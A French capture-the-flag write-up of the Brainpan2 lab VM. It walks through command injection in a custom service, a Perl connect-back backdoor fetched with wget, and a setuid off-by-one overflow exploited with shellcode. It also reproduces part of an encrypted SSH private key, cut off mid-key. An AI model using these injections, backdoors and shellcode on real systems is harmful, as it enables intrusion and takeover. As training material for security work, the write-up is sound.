# Solution du CTF Brainpan2

Introduction
------------

Un CTF, c'est comme une boîte de chocolats : on ne sait jamais sur quoi on va tomber.  

Avec ce challenge [Brainpan2](http://vulnhub.com/entry/brainpan_2,56/) trouvé sur *VulnHub* ce fût le cas car le niveau était bien plus élevé et rien ne pouvais le laisser présager car aucune indication particulière ne nous était laissé.  

Mais en suivant le principe habituel d'augmenter ses privilèges jusqu'à l'obtention du root je suis finalement parvenu à la fin de ce CTF intéressant.  

Je n'entrerais pas dans les détails de la mise en place de la VM. Référez-vous aux autres solutions de CTF sur le sujet.  

Tour du propriétaire
--------------------

```plain
nmap -A -T4 192.168.1.24

Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-09 11:46 CET
Nmap scan report for 192.168.1.24
Host is up (0.00023s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
|_http-title: Hacking Trends
| ndmp-version: 
|_  ERROR: Failed to get host information from server
1 service unrecognized despite returning data. If you know the service/version,
please submit the following fingerprint at
http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port9999-TCP:V=6.40%I=7%D=3/9%Time=531C4691%P=x86_64-suse-linux-gnu%r(N
SF:ULL,296,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[______________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:02\.0________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20LOGIN\x20AS\x20GUEST\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 08:00:27:2B:FA:27 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.1.24

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.59 seconds
```

Tout de suite on remarque deux ports non standard dont l'un est occupé par un *SimpleHTTPServer*, la ligne de commande Python que j'ai déjà eu l'occasion de mentionner dans mes articles.  

Si on se connecte depuis le navigateur on tombe sur une image tirée d'un article en relation avec le hacking. Dans la source est mentionnée en commentaire l'origine de l'article.  

Dans le doute je récupère l'image originale sur l'article cité et je la diff avec l'image du challenge : idem, rien à signaler.  

Je part ensuite à la recherche aux vulnérabilités pour ce petit serveur. Une recherche sur *bugs.python.org* retourne quelques résultats mais pour la plupart assez anciens, or le Python installé est à jour.  

Quelques tentatives de remonter l'arborescence n'ont rien donné.  

Je décide en dernier recours de lancer [DirBuster](https://sourceforge.net/projects/dirbuster/) pour tenter de découvrir des dossiers et fichiers non indexés sur le serveur. Le logiciel trouve rapidement un dossier /bin qui contient un fichier brainpan.exe.  

Mais quand on l'analyse il ne s'agit que d'une image JPEG. Un coup de *hexdump* confirme qu'il n'y a pas d'exécutable PE à l'intérieur.  

![Image Mario Bros](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan.jpg)

Du coup je me retranche sur le port 9999 auquel je me connecte via *ncat*. On a affaire à un serveur de commandes fait maison qui comporte une poignée de commandes dont certaines ne sont pas implémentées (USERS, MSG) ou non-accessibles avec nos privilèges (SYSTEM).

```plain
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[______________________ WELCOME TO BRAINPAN 2.0________________________]
                             LOGIN AS GUEST                             

                          >> GUEST
                          ACCESS GRANTED

                             *  *  *  *                                
    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
                             *  *  *  *                                

                          >> TELL ME MORE
    FILES    HELP    VIEW       CREATE
    USERS    MSG     SYSTEM     BYE
```

La commande FILES retourne une liste de fichier générée de toute évidence via un ls -l

```plain
total 40
-rwxr-xr-x 1 root   root   18424 Nov  4 15:17 brainpan.exe
-rw-r--r-- 1 root   root    1109 Nov  5 09:24 brainpan.txt
-rw-r--r-- 1 root   root     683 Nov  4 12:14 notes.txt
-rw-r--r-- 1 anansi anansi    12 Nov  5 09:16 test-1
-rwxrwxrwx 1 anansi anansi    19 Nov  9 09:16 test-2
```

Malheureusement cette commande ne prend aucun argument, on le peut donc pas remonter l'arborescence.  

La commande HELP affiche le contenu d'une page de manuel et la commande CREATE permet de créer un fichier (on saisie d'abord le nom du fichier puis ensuite le contenu sur une ligne).  

Le résultat produit un fichier avec les droits de l'utilisateur *anansi*, on sait donc qui fait tourner le serveur sur lequel on est connecté.  

Un pied dans la porte
---------------------

La commande VIEW fonctionne sur le même principe : pas de passage d'argument direct mais une invite pour saisir le nom du fichier.  

On s’aperçoit vite de deux choses : il est possible de remonter l'arborescence en spécifiant par exemple ../../../../../../etc/passwd et il est possible d'exécuter des commandes en passant par exemple ;ls.  

La commande sous-jacente est un simple *cat*. Il est donc préférable de lui passer un argument avant le point virgule sinon les process zombies risquent de s'entasser sur la machine virtuelle (car *cat* va attendre des données sur l'entrée standard).  

On passera plutôt nos commandes de cette façon :

```plain
                          >> VIEW
    ENTER FILE TO DOWNLOAD: /dev/null;id;uname -a;lsb_release -a
uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686 GNU/Linux
Distributor ID: Debian
Description:    Debian GNU/Linux 7.2 (wheezy)
Release:        7.2
Codename:       wheezy
```

Il aurait pu être intéressant de tenter de récupérer le binaire en appelant VIEW sur *brainpan.exe* mais le serveur n’envoie qu'une partie de l'exécutable s'arrêtant sans doute sur un octet nul.  

Grace à notre accès particulier on parvient à déterminer que le programme se trouve dans */opt/brainpan* qui est un dossier appartement à root mais avec le sticky bit (donc tout le monde peut écrire dedans comme dans /tmp).  

On remarque aussi que *wget* est installé :) C'est le moment d'obtenir un accès plus confortable.  

Sur la machine hôte on lance le web-serveur Python (*python -m SimpleHTTPServer 8000*) puis on récupère une backdoor Perl connect-back en injectant une commande *wget* via VIEW sur la machine invitée.  

On ouvre un port via *ncat* sur la machine hôte puis on établie la connexion depuis la machine invitée.  

```plain
                          >> VIEW
    ENTER FILE TO DOWNLOAD: /dev/null;perl dc.pl 192.168.1.3 9999
Data Cha0s Connect Back Backdoor

[*] Dumping Arguments
[*] Connecting...
[*] Spawning Shell
[*] Datached
```

L'utilisateur *anansi* n'a pas grand chose dans son dossier personnel : historique vide et pas de dossier .ssh.  

D'ailleurs SSH est configuré pour écouter sur l'interface loopback sur le port 2222, ce qui nous facilite pas la tache.  

On va plutôt installer un remplaçant de SSH, seulement gcc n'est pas installé sur la machine :(  

On va être obligés de compiler sur la machine hôte puis uploader sur la VM... sauf que je suis en 64bits alors que la Debian est une 32 bits. No problemo !  

On récupère [tsh-0.6 (Tiny Shell)](http://packetstormsecurity.com/files/31650/tsh-0.6.tgz.html), on étudie le *Makefile* et à la section Linux on rajoute *-m32* pour le binaire serveur :

```plain
gcc -O -W -Wall -o tshd $(SERVER_OBJ) -lutil -DLINUX -m32
```

Plus qu'à compiler (make linux) puis on upload/exec (./tshd). On peut maintenant se connecter sur notre nouveau shell de luxe :)  

tsh remplace très bien SSH car il offre un TTY et permet d'envoyer / récupérer des fichiers à la manière de scp.  

Une fois connecté on s’aperçoit en listant /home que l'utilisateur *reynard* a laissé des permissions à ses données en lecture pour tous.

```plain
/home/reynard:
total 44
drwxr-xr-x 3 reynard reynard 4096 Nov  7 09:54 .
drwxr-xr-x 5 root    root    4096 Nov  4 10:57 ..
-rw------- 1 reynard reynard    0 Nov  7 09:54 .bash_history
-rw-r--r-- 1 reynard reynard  220 Nov  4 10:57 .bash_logout
-rw-r--r-- 1 reynard reynard 3392 Nov  4 10:57 .bashrc
-rwsr-xr-x 1 root    root    8999 Nov  6 17:10 msg_root
-rw-r--r-- 1 reynard reynard  675 Nov  4 10:57 .profile
-rw-r--r-- 1 reynard reynard  154 Nov  5 23:20 readme.txt
-rwxr-xr-x 1 reynard reynard  137 Nov  4 19:59 startweb.sh
drwxr-xr-x 3 reynard reynard 4096 Nov  4 19:32 web
```

Highway to shell
----------------

On relève principalement la présence d'un exécutable setuid root nommé *msg\_root*.  

Le contenu du fichier *readme.txt* dans le même dossier est le suivant :  

```plain
msg_root is a quick way to send a message to the root user. 
Messages are written to /tmp/msg.txt

usage: 
msg_root "username" "this message is for root"
```

Si on exécute le programme de cette façon :  

```plain
./msg_root "plop" "ceci est mon message"
```

On retrouve dans le fichier /tmp/msg.txt :  

```plain
plop: ceci est mon message
```

L'ouverture du fichier semble se faire en mode append et on se dit que l'on a raté une occasion d'ajouter une ligne à */etc/passwd* en faisant préalablement un lien symbolique.  

On récupère le fichier via le client tsh sur la machine hôte :  

```plain
./tsh 192.168.1.21 get /home/reynard/msg_root .
8999 done.
```

On ouvre l'exécutable avec le désassembleur et débogueur [radare2](http://radare.org/y/) :  

```plain
 -- Trace the register changes when debugging with trace.cmtregs
[0x08048550]> aa
[0x08048550]> pdf@sym.main
|          ; DATA XREF from 0x08048567 (fcn.08048550)
/ (fcn) sym.main 71
|          0x0804873b    55           push ebp
|          0x0804873c    89e5         mov ebp, esp
|          0x0804873e    83ec08       sub esp, 0x8
|          0x08048741    837d0802     cmp dword [ebp+0x8], 0x2
|      ,=< 0x08048745    7f18         jg 0x804875f
|      |   0x08048747    c704244c880. mov dword [esp], str.usage_msg_rootusernamemessage ;  0x0804884c 
|      |   0x0804874e    e87dfdffff   call sym.imp.puts
|      |      sym.imp.puts(unk)
|      |   0x08048753    c7042400000. mov dword [esp], 0x0
|      |   0x0804875a    e891fdffff   call sym.imp.exit
|      |      sym.imp.exit()
|      `-> 0x0804875f    8b450c       mov eax, [ebp+0xc]
|          0x08048762    83c008       add eax, 0x8
|          0x08048765    8b10         mov edx, [eax]
|          0x08048767    8b450c       mov eax, [ebp+0xc]
|          0x0804876a    83c004       add eax, 0x4
|          0x0804876d    8b00         mov eax, [eax]
|          0x0804876f    89542404     mov [esp+0x4], edx
|          0x08048773    890424       mov [esp], eax
|          0x08048776    e826ffffff   call sym.get_name
|             sym.get_name()
|          0x0804877b    b800000000   mov eax, 0x0
|          0x08048780    c9           leave
\          0x08048781    c3           ret
```

Le programme vérifie d'abord le nombre d'argument puis affiche un message et quitte s'il n'a pas eu le bon nombre.  

Si tout est ok, il repasse ces arguments à la fonction *get\_name* du programme (le programme n'est pas strippé, c'est pour cela que le nom de la fonction apparaît).  

Cette méthode commence par réserver 32 octets (0x20) pour les variables locales.  

```plain
[0x08048550]> pdf@sym.get_name
|          ; CODE (CALL) XREF from 0x08048776 (unk)
/ (fcn) sym.get_name 154
|          0x080486a1    55           push ebp
|          0x080486a2    89e5         mov ebp, esp
|          0x080486a4    83ec20       sub esp, 0x20           ;  32 octets réservés pour les variables locales
|          0x080486a7    c745fc3c860. mov dword [ebp-0x4], sym.save_msg ;  0x0804863c 
|          0x080486ae    8b4508       mov eax, [ebp+0x8]      ; premier parametre passe a la fonction : username
|          0x080486b1    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x08048500 (fcn.080484f6)
|          0x080486b4    e847feffff   call sym.imp.strlen     ; strlen(1er arg)
|             sym.imp.strlen(unk)
|          0x080486b9    83f811       cmp eax, 0x11           ; compare la taille avec 17
|      ,=< 0x080486bc    7714         ja 0x80486d2
|      |   0x080486be    8b4508       mov eax, [ebp+0x8]
|      |   0x080486c1    89442404     mov [esp+0x4], eax      ; source = 1er argument
|      |   0x080486c5    8d45ee       lea eax, [ebp-0x12]     ; adresse = ebp-18
|      |   0x080486c8    890424       mov [esp], eax          ; destination : buffer sur la stack
|      |   0x080486cb    e8e0fdffff   call sym.imp.strcpy
|      |      sym.imp.strcpy()
|          ; CODE (CALL) XREF from 0x0804873b (unk)
|     ,==< 0x080486d0    eb1a         jmp loc.080486ec
|     |`-> 0x080486d2    c7442408120. mov dword [esp+0x8], 0x12 ;  0x00000012 <- limite = 18 octets
|     |    0x080486da    8b4508       mov eax, [ebp+0x8]
|     |    0x080486dd    89442404     mov [esp+0x4], eax      ; source = 1er argument
|     |    0x080486e1    8d45ee       lea eax, [ebp-0x12]
|     |    0x080486e4    890424       mov [esp], eax          ; destination = buffer sur la stack
|     |    ; CODE (CALL) XREF from 0x08048540 (fcn.08048536)
|     |    0x080486e7    e854feffff   call sym.imp.strncpy    ; copie au plus 18 octets
|     |       sym.imp.strncpy()
|     |    ; CODE (CALL) XREF from 0x080486d0 (unk)
|- loc.080486ec 79
|     `--> 0x080486ec    c70424d0070. mov dword [esp], 0x7d0 ;  0x000007d0  = 2000 octets
|          ; CODE (CALL) XREF from 0x080484c0 (fcn.080484b6)
|          0x080486f3    e8c8fdffff   call sym.imp.malloc
|             sym.imp.malloc()
|          0x080486f8    8945f8       mov [ebp-0x8], eax      ; adresse de la zone allouée via malloc()
|          0x080486fb    8b450c       mov eax, [ebp+0xc]      ; second parametre : msg
|          0x080486fe    890424       mov [esp], eax
|          0x08048701    e8fafdffff   call sym.imp.strlen
|             sym.imp.strlen()
|          0x08048706    89442408     mov [esp+0x8], eax      ; strlen(2nd param)
|          0x0804870a    8b450c       mov eax, [ebp+0xc]
|          0x0804870d    89442404     mov [esp+0x4], eax      ; 2nd param
|          0x08048711    8b45f8       mov eax, [ebp-0x8]
|          0x08048714    890424       mov [esp], eax          ; zone allouée via le malloc()
|          0x08048717    e824feffff   call sym.imp.strncpy
|             sym.imp.strncpy()
|          0x0804871c    8b45f8       mov eax, [ebp-0x8]
|          0x0804871f    89442404     mov [esp+0x4], eax      ; 2nd arg recopie sur le tas
|          0x08048723    8d45ee       lea eax, [ebp-0x12]
|          0x08048726    890424       mov [esp], eax          ; 1er arg recopie sur la pile
|          0x08048729    8b45fc       mov eax, [ebp-0x4]
|          0x0804872c    ffd0         call eax                ; appelle la methode save_msg qui etait passee en parametre
|             0x00000000()
|          0x0804872e    8b45f8       mov eax, [ebp-0x8]
|          0x08048731    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x08048490 (fcn.08048486)
|          0x08048734    e857fdffff   call sym.imp.free       ; libere la zone allouée
|             sym.imp.free()
|          0x08048739    c9           leave
\          0x0804873a    c3           ret
```

En faisant l'inventaire des adresses relatives à ebp en négatif on détermine que la fonction a 3 variables locales (respectivement ebp-4, -8 et -18 en décimal).  

A l'instruction 0x080486a7, l'adresse de la fonction *msg\_root* est copiée dans ebp-4.  

En ebp-0x12 (= ebp-18), c'est l'adresse d'un buffer qui est passé. Ce buffer est plus tard utilisé comme destination soit pour strcpy soit pour strncpy.  

Enfin à ebp-8 on trouvera une adresse mémoire pointant vers une zone allouée sur le tas par malloc().  

Notez que le buffer utilisé pour str(n)cpy semble bizarrement aligné car 18 n'est pas un multiple de 4 (32 bits).  

Je ne saurais pas dire si c'est la volonté du compilateur ou le résultat d'une modification du binaire pour le challenge.  

Du coup on a une stack que l'on pourrait représenter de cette façon :  

```plain
adresses hautes
|  2nd arg  | <- ebp+12
|  1er arg  | <- ebp+8
 ----------
| saved eip | <- ebp+4
| saved ebp | <- ebp
 --- ebp ---
| @save_msg | <- ebp-4
| @malloc   | <- ebp-8
|  ebp-12   | <- esp+8
|  ebp-16   | <- esp+4
|  ebp-20   | <- debut buffer à ebp-18
 --- esp ---
adresses basses
```

Dans tous les cas, cette fonction *get\_name* commence par tester la longueur du nom d'utilisateur.  

Si cette longueur est inférieure ou égale à 17, le nom d'utilisateur est copié vers ebp-18 à l'aide de strcpy.  

Si la longueur est supérieure à 17, la copie est réalisée avec strncpy en spécifiant une taille de 18 octets.  

Déjà on remarque un problème car de ebp-18 à ebp-8 il n'y a que 10 octets (le calcul est pas difficile :p )  

Donc si l'on passe un nom d'utilisateur de plus de 10 caractères on écrase déjà ce qui suit.  

En revanche comme on ne peut écraser que maximum 18 octets via l'appel à strncpy, on ne peut pas écraser ni le saved-ebp ni le saved-eip.  

L'objectif sera donc d'écraser l'adresse de *save\_msg* qui est stocké à ebp-4.  

Si on passe un nom d'utilisateur de 17 caractères, le programme invoque strcpy et écrase 3 octets à ebp-4, le 4ème étant l'octet nul ajouté par strcpy.  

En revanche si on passe 18 caractères (ou plus), on écrase entièrement la pointeur vers *save\_msg* car comme indiqué dans la manpage de strncpy :  

> The stpncpy() and strncpy() functions copy at most n characters from src into dst. If src is less than n characters long, the remainder of dst is filled with '\0' characters. Otherwise, dst is not terminated.

C'est ce qu'on appelle une erreur "[off-by-one](https://fr.wikipedia.org/wiki/Erreur_off-by-one)" car à un octet près le développeur a introduit un bug, ici en ne prévoyant pas l'espace pour l'octet nul final.  

Interlude éducative
-------------------

Prenons l'exemple suivant pour illustrer ce qui se passe :  

```c
/* A compiler avec -fno-stack-protector, voir -D_FORTIFY_SOURCE=0 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
  int count = atoi(argv[1]);
  char s[4];
  char buff[8] ;
  int i;

  strcpy(s, "XXX");

  for (i=0; i<8; i++) buff[i] = 'V' ;

  printf("Copie de %d octets.\n", count);
  strncpy(buff, argv[2], count);
  printf("Copy: %s.\n", buff);
  printf("s = %s.\n", s);
  return 0;
}
```

Ici on a deux buffers sur la pile : buff sur lequel va être recopié des caractères via strncpy et s qui est initialisé à "XXX".  

En plus de la chaîne à copier dans buff, le programme prend aussi le nombre d'octets à copier (count).  

Du moment que count est supérieur à taille du buffer passé et inférieur à 9 tout va bien :  

```plain
./test 2 A
Copie de 2 octets.
Copy: A.
s = XXX.

./test 7 AAAA
Copie de 7 octets.
Copy: AAAA.
s = XXX.
```

Si count est égal à la taille du buffer passé alors le zéro terminal n'est pas placé :  

```plain
./test 4 AAAA
Copie de 4 octets.
Copy: AAAAVVVVXXX.
s = XXX.
```

sans pour autant qu'on écrase tout le reste (strncpy s'arrête tout de même sinon aucun intérêt) :  

```plain
./test 4 AAAAAA
Copie de 4 octets.
Copy: AAAAVVVVXXX.
s = XXX.
```

A partir de 12 on a un comportement original car on écrase s et comme la chaîne n'est pas terminée elle lit des caractères dans count (et éventuellement du padding).  

```plain
./test 12 AAAAAAAAAAAA
Copie de 12 octets.
Copy: AAAAAAAAAAAA
                  .
s = AAAA
        .
```

G0tr00t ?
---------

Revenons à nos moutons en appliquant tout ça au programme qui nous intéresse. D'abord on teste avec un utilisateur de 17 caractères :  

```plain
sh-4.2$ gdb -q ./msg_root 
Reading symbols from msg_root...done.
(gdb) r `python -c "print 'A'*17"` test
Starting program: msg_root `python -c "print 'A'*17"` test

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
```

On a bien écrasé *saved\_msg* (mais seulement en partie car strcpy a ajouté un octet nul) et le programme a tenté de sauter à cette adresse.  

Maintenant testons avec 18 caractères (ou plus).  

```plain
(gdb) r `python -c "print 'A'*25"` test
Starting program: msg_root `python -c "print 'A'*25"` test

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Idem sauf qu'on écrase totalement le pointeur de fonction. On a donc le contrôle potentiel du flux d'exécution du programme.  

Ici la difficulté est liée au fait qu'on a un buffer très petit pour placer le shellcode (14 octets sans [nop-slep](https://en.wikipedia.org/wiki/NOP_slide))  

Heureusement pour nous, l'[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) n'est pas activée :  

```plain
anansi@brainpan2:~$ cat /proc/sys/kernel/randomize_va_space
0
```

On va donc pouvoir faire une exploitation "old-school" qui consiste à charger le shellcode en environnement, auquel cas on aura toute la place souhaitée pour le shellcode avec un nop-sled énorme :)  

On écrit un petit programme qui nous donnera l'adresse du shellcode une fois monté dans l'environnement :  

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
  char *s = getenv("EGG");
  printf("EGG => %p\n", s);
  return 0;
}
```

On compile, on upload, on rend exécutable...  

On trouve [un shellcode sympa](http://www.shell-storm.org/shellcode/files/shellcode-399.php) qu'on exporte avec un nop-slep de 64000 octets (c'est une piscine olympique de nops !)  

```plain
anansi@brainpan2:~$ export EGG=`perl -e 'print "\x90"x64000 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
anansi@brainpan2:~$ /tmp/get_addr 
EGG => 0xbfff0007
```

Comble de la malchance, un octet nul est présent dans l'adresse... Mais vu la taille du nop-sled on peut mettre 256 de plus, on est toujours dedans :  

```plain
anansi@brainpan2:~$ /home/reynard/msg_root `perl -e 'print "A"x14 . "\x07\x01\xff\xbf"'` test
$ id
uid=104(root) gid=1000(anansi) groups=106(root),50(staff),1000(anansi)
```

Bingo !  

Un petit tour de manip plus tard afin de relancer *tshd* mais avec nos nouveaux privilèges...  

```plain
root # cd /root/
root # ls -al
total 28
drwx------  3 root  root  4096 Nov  5 09:56 .
drwxr-xr-x 22 root  root  4096 Nov  5 07:09 ..
drwx------  2 root  root  4096 Nov  4 10:08 .aptitude
-rw-------  1 root  root     0 Nov  5 09:57 .bash_history
-rw-r--r--  1 root  root   589 Nov  5 09:56 .bashrc
-rw-r--r--  1 root  root   159 Nov  5 09:56 .profile
-rw-------  1 root  root   461 Nov  5 09:48 flag.txt
-rw-------  1 root  root   245 Nov  5 09:47 whatif.txt
```

Le flag est là ! Sauf que...

```plain
root # cat flag.txt 
cat: flag.txt: Permission denied
root # cat whatif.txt 

       WHAT IF I TOLD YOU
              ___
            /     \ 
           | ______\
          (, \_/ \_/
           |   ._. |
           \   --- /
           /`-.__.'
      .---'`-.___|\___
     /                `.

       YOU ARE NOT ROOT?

root # stat flag.txt 
  File: `flag.txt'
  Size: 461             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 270724      Links: 1
Access: (0600/-rw-------)  Uid: (    0/   root )   Gid: (    0/   root )
Access: 2013-11-05 09:48:06.328281548 -0500
Modify: 2013-11-05 09:48:06.332281563 -0500
Change: 2013-11-05 09:48:06.336281759 -0500
 Birth: -
root # stat whatif.txt 
  File: `whatif.txt'
  Size: 245             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 263011      Links: 1
Access: (0600/-rw-------)  Uid: (  104/    root)   Gid: (  106/    root)
Access: 2014-03-11 05:19:27.297220356 -0400
Modify: 2013-11-05 09:47:34.180279151 -0500
Change: 2013-11-05 09:47:34.316281925 -0500
 Birth: -
```

On nous a fait un mauvais tour : il y a deux utilisateurs root.  

L'un est le vrai (uid 0) et a un espace en fin de username, l'autre est en fait un utilisateur lambda (uid 104) mais avec le username root classique.  

Avec une recherche de fichiers on trouve dans */opt/old* un dossier *'brainpan-1.8'* appartenant au faux root :  

```plain
root # ls -l /opt/old/brainpan-1.8/
total 28
-rwsr-xr-x 1 puck puck  17734 Nov  4 14:37 brainpan-1.8.exe
-rw-r--r-- 1 puck puck   1227 Nov  5 09:24 brainpan.7
-rw-rw-rw- 1 puck staff    27 Nov  5 09:25 brainpan.cfg
```

Same old story
--------------

On remarque un exécutable setuid pour l'utilisateur *puck*.  

```plain
root # cat /opt/old/brainpan-1.8/brainpan.cfg
port=9333
ipaddr=127.0.0.1
```

Il faut éditer le fichier de configuration du *brainpan* pour changer l'interface en 0.0.0.0. Il faut aussi être dans le même dossier que le binaire pour le lancer sinon on obtient une erreur *fopen*.  

En se connectant on remarque qu'il s'agit d'une version avec moins de fonctionnalités mais la faille de VIEW est aussi présente.  

Par conséquent on récupère la clé privée SSH de *puck* :  

```plain
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BD1AC12F9D45BB7CAFB17D7CC7FEF8E5

wLz1KrRZPOJrWimHsajMI/4MH1tjbkInm+2BZBUDrQNXTzy2RGuN8mqSnBkczQrq
PLyLoDXJDEx1aP6vLDVnyQOn4a0jbSIFBBobuxsTy8T926aueaHPWMmY2AabIBob
kAWbnRS1UvYrRIL2s3/oc1+2DOF8ODWAYiHZWLJiElTX7d1OXC9KWogXttMsxzKF
W5duBXnCmbc6QkekksF2m//592smuy9s1Y1B4YqGOSWDKYmwS8HUwOpgOuyeIjNT
j4dDcy2McX3xPdn/XnVwwIp/6Fl8Zrz9uR52WBsjfZQHVKNlyJKJuB02C5A2Lf2h
o2BtupP66gdwQdvn2g11joKEoybg3YezRE6w9pWmBbxWjuM8B0EaxDtZe+x6VvrB
J8lJn3mjItitP1mU84zjjmO02AI/HBYQAurYfnZ8g/KDdmRDouIEpVVVt56k5WHl
cBlhpmoBZ9UJH9D9MZagME8Xsc0g7EBE7Pakckq3nTrW5A0acINjbKV9qUBC/+it
XsSePy2kUjgZQ9eMp0H+6/DP6TkXfn/x5r6Ia1kerk2guCCvvYqFnTpJ8XvtApMk
equ82CJqQw8dryAcMhWWoWbyeB3x6r6JSwoF4LaTd27kzfKMynqiLzpTAjzCAwHm
Zh1ZFwC64iyLCldR5kQxYnDLQ6DqGBM0TYo65KJI1is/cYuvqiYisJie5It1Fffl
V0wU8bkbDyZhpuLtlw2ioaPTrlxK3O7TmxxouwpxaymCwO/WI7jsxdRi26QUCTGk
zCdR1xwlnyN8nfvfRmRjVkrAvDKycon1CjJQiXE2m7jgyeO/4Zb2QBUqwQo4YjgG
30kyx6rBVWbTx/KRr2V8y3i6Wib6EMqT3akGIsEKoEjoEuoN+K8dpbwvDro5pS2/
aHxE8aDB2TfhU90W64Zos5fJHwLCqI9Feq6trcJXOevAB6bCEzXuuZAmqB+Aq74w
859Kvz0GFZ1w3YsC/KotRxrP3kYCnH8w9GJZRmHMRjXFPDntg1pKhHQiH3fPOxVf
UqC+SMsPz9UTv1sPGbNnbNc/tNjOnCb8P9H62NDBYFfwotHIB/hXPgYEmXeTHEAA
Qc9AxaPcA7xH7E4SZG9pSFmI1+bBuMTSgqAXsB5EFaIJNYB3/ZMaayv1XoaIE1YM
lXZ8ScozHTlL7fgl/b3rC/L9Mu1tesFqbsUyp1ifQHBXa8KUWAfeB5GEUsY3YGva
w6iLxobhQMsByceVmXs3HhEynIL4cz4T6o6XHfpOWnLrtkIenSVpOX9GSmMUFi5e
t0IQYCtZKiLPacj2ECjITztRO8hwCoW0WVhO2p3BwY5De+LmncPSRZavPYWs7QWK
